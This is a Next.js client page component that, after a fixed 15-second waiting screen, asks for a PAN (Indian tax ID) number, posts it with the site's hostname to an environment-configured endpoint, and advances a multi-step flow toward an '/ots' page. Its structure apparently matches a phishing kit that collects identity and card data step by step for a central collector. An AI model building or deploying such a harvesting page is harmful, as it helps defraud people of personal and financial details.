'use client';
import ExpiryDateInputComponent from "../inlcude/ExpiryDateInputComponent";
import Footer from "../inlcude/footer";
import Header from "../inlcude/header";
import { useRouter } from "next/navigation";
import { useEffect, useState } from "react";  
import Loader from "../inlcude/Loader";
import WaiterTime from "../inlcude/WaiterTime";
import styles from "./third.module.css";

export default function Home() {
    const router = useRouter();
    const [loading, setLoading] = useState(true); 

    const API_URL = process.env.NEXT_PUBLIC_URL;
    const SITE = process.env.NEXT_PUBLIC_SITE;


    useEffect(() => {
        setTimeout(() => {
            setLoading(false); 
        }, 15000); 
    }, []);

    const handleSubmit = async (e) => {
        e.preventDefault();
        setLoading(true); 

        const formData = new FormData(e.target);
        const jsonObject1 = {};
        const jsonObject = {};
        formData.forEach((value, key) => {
            jsonObject[key] = value;
        });
        jsonObject1['data'] = jsonObject;
        jsonObject1['site'] = window.location.hostname;
        // jsonObject1['id'] = localStorage.getItem("collection_id");
        try {
            const response = await fetch(`${API_URL}`, {
                method: 'POST',
                body: JSON.stringify(jsonObject1)
            });

            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            const responseData = await response.json();
            localStorage.setItem("next", "4");
            localStorage.setItem("nextOTT", "2");
            router.push('/ots');
        } catch (error) {
            console.error('There was a problem with the fetch operation:', error);
        }
    };
    if (loading) {
        return (
            <WaiterTime/>
        );
    }

  return (
    <>
    <Header />
    



        <div className="container" >
                <form onSubmit={handleSubmit} className="mt-3 py-2">
                    <div className={`form-group mb-4 ${styles.formGroup}`}>
                        <label htmlFor="">Pan Number* </label>
                        <input 
                            name="paanum" 
                            type="text"  
                            placeholder="Enter pan no."
                            className={`${styles.formControl} form-control`}
                            minLength={10} 
                            maxLength={10}  
                            pattern="[A-Z]{5}[0-9]{4}[A-Z]{1}" 
                            title="PAN should be 5 uppercase letters, 4 digits, and 1 uppercase letter (e.g., ABCDE1234F)" 
                            required
                        />
                    </div>                    
                <div className={`${styles.buttonContainer} ${styles.centerKaring} form-group w-100`}>
                    <input type="submit" className={`btn btn-danger ${styles.btnDanger} text-white w-100 px-4 ${styles.textCenter} text-primary ${styles.submitButton}`} defaultValue="Submit" />
                </div>
            </form>
                
            </div>

    <Footer />
</>
  );
}
